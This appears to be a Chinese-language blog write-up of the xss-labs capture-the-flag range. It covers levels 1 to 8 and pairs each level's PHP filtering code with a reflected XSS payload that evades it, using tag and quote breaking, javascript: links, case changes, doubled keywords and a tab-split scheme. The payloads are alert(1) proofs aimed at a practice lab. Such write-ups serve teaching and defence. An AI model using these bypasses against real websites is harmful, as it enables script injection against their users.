@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='XSS 挑战之旅 靶场：https://github.com/do0dl3/xss-labs 在线靶场：http://test.ctf8.com/ 参考'><title>XSS 挑战之旅</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/xss_challenge_trip/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='XSS 挑战之旅'>
+<meta property='og:description' content='XSS 挑战之旅 靶场：https://github.com/do0dl3/xss-labs 在线靶场：http://test.ctf8.com/ 参考'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/xss_challenge_trip/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='xss' /><meta property='article:published_time' content='2022-05-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-18T22:40:45&#43;01:00'/>
+<meta name="twitter:title" content="XSS 挑战之旅">
+<meta name="twitter:description" content="XSS 挑战之旅 靶场：https://github.com/do0dl3/xss-labs 在线靶场：http://test.ctf8.com/ 参考">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/xss_challenge_trip/">XSS 挑战之旅</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 18, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="xss-挑战之旅">XSS 挑战之旅</h2>
+<p>靶场：<a class="link" href="https://github.com/do0dl3/xss-labs"  target="_blank" rel="noopener"
+    >https://github.com/do0dl3/xss-labs</a> <!-- raw HTML omitted -->
+在线靶场：<a class="link" href="http://test.ctf8.com/"  target="_blank" rel="noopener"
+    >http://test.ctf8.com/</a> <!-- raw HTML omitted -->
+参考wp：<a class="link" href="http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"  target="_blank" rel="noopener"
+    >http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</a> <!-- raw HTML omitted --></p>
+<h3 id="level1">level1</h3>
+<p>我们观察url可以发现有一个叫做 <code>name</code> 的GET参数，我们直接修改它就是完成一个反射型XSS <!-- raw HTML omitted --></p>
+<p><a class="link" href="http://test.ctf8.com/level1.php?name=test"  target="_blank" rel="noopener"
+    >http://test.ctf8.com/level1.php?name=test</a> <!-- raw HTML omitted -->
+&lt;h2 align=&ldquo;center&rdquo;&gt;欢迎用户test&lt;/h2&gt; <!-- raw HTML omitted --></p>
+<p>我们通过闭合&lt;/h2&gt;并在里面加入JS <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="level2">level2</h3>
+<p>level2我们同样观察前端html代码，然后通过闭合input tag的内容弹出JS <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;keyword&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;test&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#34;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span><span class="err">&lt;</span>
+</span></span></code></pre></div><p>这里为什么我们不能像level1里面一样使用 <code>&lt;h2&gt;</code> 来进行js的注入呢，我们可以来看一下源码 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="err">&#39;</span><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>这里是使用了函数 <code>htmlspecialchars</code> 来将特殊字符转换为HTML实体（无法被解析的string？）,因此无法完成闭合与JS代码的执行 <!-- raw HTML omitted --></p>
+<ul>
+<li>&amp; (ampersand) becomes &amp;amp; <!-- raw HTML omitted --></li>
+<li>&quot; (double quote) becomes &amp;quot; <!-- raw HTML omitted --></li>
+<li>&rsquo; (single quote) becomes &amp;#039; <!-- raw HTML omitted --></li>
+<li>&lt; (less than) becomes &amp;lt; <!-- raw HTML omitted --></li>
+<li>&gt; (greater than) becomes &amp;gt; <!-- raw HTML omitted --></li>
+</ul>
+<h3 id="level3">level3</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;form action=level3.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;input name=keyword  value=&#39;&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&gt;
+</span></span></span></code></pre></div><p>检查源代码，发现两边的$str都被替换了，因此我们必须要绕过这些特殊字符，利用标签内的attribute进行绕过 <!-- raw HTML omitted --></p>
+<p>这边建议大家可以检查一下 <code>检查源码</code> 以及浏览器 <code>inspector</code> 里面的源码的区别，以检查源码得到的html为标准，进行引号的闭合 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#39; onclick=&#39;alert(1)
+</span></span></code></pre></div><p>然后补充一下关于 <code>htmlspecialchars</code> 的使用，默认是不过滤引号的，可以在参数中设置flag来进行过滤，也就是为什么我们在这里还可以使用引号来进行绕过 <!-- raw HTML omitted --></p>
+<h3 id="level4">level4</h3>
+<p>检查源码的内容，发现这里对于括号都进行了替换，但是还是没有加入对于引号的检查和转换，所以还是和level3一样的套路 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level4.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str3</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p>这次需要用双引号，建议大家多做尝试，然后看一下源码的显示 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#34; onclick=&#34;alert(1)
+</span></span></code></pre></div><h3 id="level5">level5</h3>
+<p>检查源码，对于 <code>&lt;script&gt;</code> 以及 <code>on</code> 进行了替换，那么我们就需要找到新的注入姿势， <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;script&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;scr_ipt&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="s2">&#34;o_n&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level5.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str3</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p>我们通过用 <code>&lt;a&gt;</code> 直接写入一个链接来进行js的执行 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#34;&gt; <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span> XSS <span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="level6">level6</h3>
+<p>增加了过滤的tag种类，但是可以通过改变大小写绕过 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;script&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;scr_ipt&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="s2">&#34;o_n&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str4</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span><span class="s2">&#34;sr_c&#34;</span><span class="p">,</span><span class="nv">$str3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str5</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;da_ta&#34;</span><span class="p">,</span><span class="nv">$str4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str6</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span><span class="s2">&#34;hr_ef&#34;</span><span class="p">,</span><span class="nv">$str5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level6.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str6</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">&#34;&gt; <span class="p">&lt;</span><span class="nt">a</span> <span class="na">hRef</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span> XSS <span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="level7">level7</h3>
+<p>在level6的基础上加上了大小写的过滤，老思路，单纯的替换则可以利用双写绕过 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str4</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str5</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str6</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;h2 align=center&gt;没有找到和&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;相关的结果.&lt;/h2&gt;&#34;</span><span class="o">.</span><span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level7.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nv">$str6</span><span class="o">.</span><span class="err">&#39;</span><span class="s2">&#34;&gt;
+</span></span></span></code></pre></div><p>注意一下，这里还有一个 <code>script</code> 需要双写 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt; XSS &lt;/a&gt;
+</span></span></code></pre></div><h3 id="level8">level8</h3>
+<p>在level7的基础上，增加了双引号的过滤，同时加入下划线对tag进行破坏 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;keyword&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">,</span><span class="s2">&#34;scr_ipt&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str3</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;on&#34;</span><span class="p">,</span><span class="s2">&#34;o_n&#34;</span><span class="p">,</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str4</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span><span class="s2">&#34;sr_c&#34;</span><span class="p">,</span><span class="nv">$str3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str5</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;da_ta&#34;</span><span class="p">,</span><span class="nv">$str4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str6</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span><span class="s2">&#34;hr_ef&#34;</span><span class="p">,</span><span class="nv">$str5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str7</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;quot&#39;</span><span class="p">,</span><span class="nv">$str6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;form action=level8.php method=GET&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input name=keyword  value=&#34;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;input type=submit name=submit value=添加友情链接 /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;&#39;.$str7.&#39;&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;
+</span></span></span></code></pre></div><p>我们可以使用 <code>%09</code> 进行换行来避免下划线，但是不能在输入框内完成，需要放在url中才能被正常解析 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">keyword=javascr%09ipt:alert(1)
+</span></span></code></pre></div><p>可以使用html编码 <!-- raw HTML omitted --></p>
